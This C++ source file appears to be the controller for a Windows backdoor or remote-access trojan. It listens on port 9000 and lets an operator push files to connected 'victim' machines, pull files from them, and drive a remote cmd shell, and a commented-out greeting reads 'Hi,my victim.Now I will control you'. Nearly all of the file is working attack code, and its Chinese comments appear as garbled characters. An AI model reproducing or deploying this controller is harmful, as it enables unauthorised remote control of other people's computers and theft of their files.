//#include <winsock2.h>
#include "windows.h"
#include <conio.h>
#include <stdlib.h>
//#include <fstream.h>
#include <fstream>
#include <io.h>
#include <string.h>
#include <stdio.h>
#include "Mem.h"
#include "Receive.h"

#define Upload_file "csendv" //�����ˡ��ܺ��� ���ļ�
#define Download_file "cget" //�ܺ��ˡ������� ���ļ�
#define Call_cmd "cmd"
#define Quit "quit"


#define MAX_INPUT_BUFFER 500
#define MAX_OUTPUT_BUFFER 4096

#define MAX_THREADS 3
#define DEFAULT_BUFLEN 1500
#pragma comment (lib, "ws2_32")         //socket���ļ�


//const char*IPADDR = "127.0.0.1";
//"10.64.136.179";"127.0.0.1";"10.64.136.188";"192.168.1.116";
u_short PORT = 9000;

bool running;
char inputUser[MAX_INPUT_BUFFER];

void readFromSocket(SOCKET& sock);
int Callcmd(SOCKET& sock);


DWORD WINAPI MyThreadFunction(LPVOID lpParam);

int main(void)
{
	int count = 0;//record the socket num
	int iResult;

	SOCKET CtlSocket;
	SOCKET ClientSocket;

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	CtlSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	sockaddr_in sockaddr;
	sockaddr.sin_family = PF_INET;	//AF_INET
	sockaddr.sin_addr.S_un.S_addr = INADDR_ANY;//inet_addr(IPADDR);INADDR_ANY
	sockaddr.sin_port = htons(PORT);

	bind(CtlSocket, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR));

	listen(CtlSocket, SOMAXCONN);
	printf("Listening on port [%d].\n", PORT);

	HANDLE ThreadArray[MAX_THREADS];

	while (true)
	{
		SOCKADDR clientaddr;
		int size = sizeof(SOCKADDR);

		if (count >= MAX_THREADS)
		{
			printf("Exceeded max clients.Can't connect the server now.\n ");
			//continue;	//�����ͻ����Ժ� ���µȴ� δʵ��
			break;	//�������ͻ��˼�����
		}

		ClientSocket = accept(CtlSocket, &clientaddr, &size);
		if (ClientSocket == INVALID_SOCKET)
		{
			printf("MySocket accept error \n ");
			//closesocket(CtlSocket);
			continue;
		}
		printf("New client touched(socket):%d.\n", ClientSocket);


		//һ���������� ���߳� ����ͻ���
		ThreadArray[count] = CreateThread(
			NULL,
			0,
			MyThreadFunction,
			&ClientSocket,
			0,
			NULL);

		count++;

	}

	WaitForMultipleObjects(MAX_THREADS + 1, ThreadArray, true, INFINITE);

	closesocket(CtlSocket);

	for (int i = 0; i < MAX_THREADS; i++)
	{
		CloseHandle(ThreadArray[i]);
	}

	WSACleanup();
	printf("Clean all.\n");

	system("pause");

}

DWORD WINAPI MyThreadFunction(LPVOID lpParam)
{
	int iResult;
	SOCKET ClientSocket = *(SOCKET*)lpParam;

	/*char*msg = "Hi,my victim.Now I will control you.\r\n";
	iResult = send(ClientSocket, msg, strlen(msg) + sizeof(char), NULL);
	if (iResult == SOCKET_ERROR)
	{
		printf("send msg error.\n");
		closesocket(ClientSocket);
		WSACleanup();
		return ERROR;
	}*/


	char buffer[DEFAULT_BUFLEN];
	int buflen = DEFAULT_BUFLEN;

	char* mymsg;
	//PHDR mymsg;
	char Op_Type[20] = { 0 };

	//ѭ���������ֱ�����ƶ�����quit
	int quit = NULL;
	for (int i = 0; quit != 1; i++)
	{
		printf_s("<Control>");
		gets_s(Op_Type);//����ָ�

		if (strcmp(Op_Type, Upload_file) == 0)//�����ϴ��ļ�������
		{
			char File_Dir[260] = { 0 };//����������ļ�·��
			char C_File_Dir[260] = { 0 };//���屾���ļ�·��

			printf_s("<Control>(����Ŀ��·������\\��β) ");
			gets_s(File_Dir);

			printf_s("<Control>(����ԭʼ·��,���ļ���) ");
			gets_s(C_File_Dir);

			if(Uploadfile(File_Dir, C_File_Dir, ClientSocket)== ERROR)
				continue;//������·�����봦����
			
			recv(ClientSocket, buffer, DEFAULT_BUFLEN, NULL);//���շ��������ؽ��

			//HDR pl;
			//Receive_Commen(&pl, buffer, IDtt - 1);//�Է��ؽ�����н⹹

			//����ֱ������ת��char��PHDR���ṹ�����������ָ�룬��ɶ�Ӧ
			PHDR pl = (PHDR)buffer;
			printf(pl->filecont);

		}
		else if (strcmp(Op_Type, Download_file) == 0)//���������ļ�����
		{
			char File_Dir[260] = { 0 };//���������·��
			char Dir_Name[260] = { 0 };//����Ŀ���ļ���

			/*printf_s("<Control>(����ԭʼ�ļ�·������\\��β)");
			gets_s(File_Dir);

			printf_s("<Control>(�����ļ���)");
			gets_s(Dir_Name);*/
			
			strcpy(File_Dir, "F:\\vic\\");
			strcpy(Dir_Name, "vic.txt");

			mymsg = Downloadfile(File_Dir, Dir_Name);//���������봦����	
		
			send(ClientSocket, mymsg, DEFAULT_BUFLEN, NULL);//���ͱ���

			PHDR pl = (PHDR)buffer;
			do {
				recv(ClientSocket, buffer, DEFAULT_BUFLEN, NULL);
				Receive_Download(pl, IDtt - 1, Dir_Name);
				if (pl->slice_num == pl->slice_sum - 1)
					break;

			} while (pl->slice_num < pl->slice_sum);
			printf_s("�ļ�������ɣ�\n");

		}
		else if (strcmp(Op_Type, Call_cmd) == 0)//����cmd����
		{
			send(ClientSocket, Op_Type, DEFAULT_BUFLEN, NULL);//���ͱ���
			Callcmd(ClientSocket);
		}
		else if (strcmp(Op_Type, Quit) == 0)	//����quit����
		{
			quit = 1;
			printf_s("<Control>�ѹر����� ");
			return 1;
		}
		
		else
			printf_s("no such command!!!!\n");
	}

}



int Callcmd(SOCKET& sock)
{
	DWORD thId;
	CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)readFromSocket,
		&sock,
		NULL,
		&thId);

	do
	{
		fgets(inputUser, MAX_INPUT_BUFFER, stdin);
		if (_strcmpi(inputUser, "cls\n") == 0 || _strcmpi(inputUser, "clear\n") == 0)
		{
			system("cls");
			printf("$shell>");
			continue;
		}
		send(sock, inputUser, strlen(inputUser), NULL);

	} while (_strcmpi(inputUser, "exit\n") != 0);

	return 0;
}

void readFromSocket(SOCKET& sock)
{
	int iResult;
	char outputBuffer[MAX_OUTPUT_BUFFER];;
	while (true)
	{
		//recv()����ʵ��copy���ֽ���
		iResult = recv(sock, outputBuffer, MAX_OUTPUT_BUFFER, 0);
		if (iResult == -1)
		{
			break;
		}

		if (iResult < 4096)
			outputBuffer[iResult] = '\0';
		else
			printf("iResult > 4096\n");

		if (_strcmpi(inputUser, outputBuffer) == 0)
			continue;

		printf("%s", outputBuffer);
		//cout << outputBuffer;

		//fflush()������ϴ���е���Ϣ���ú���ͨ�����ڴ�������ļ�
		//stdout-��׼������ļ����
		fflush(stdout);
	}
}
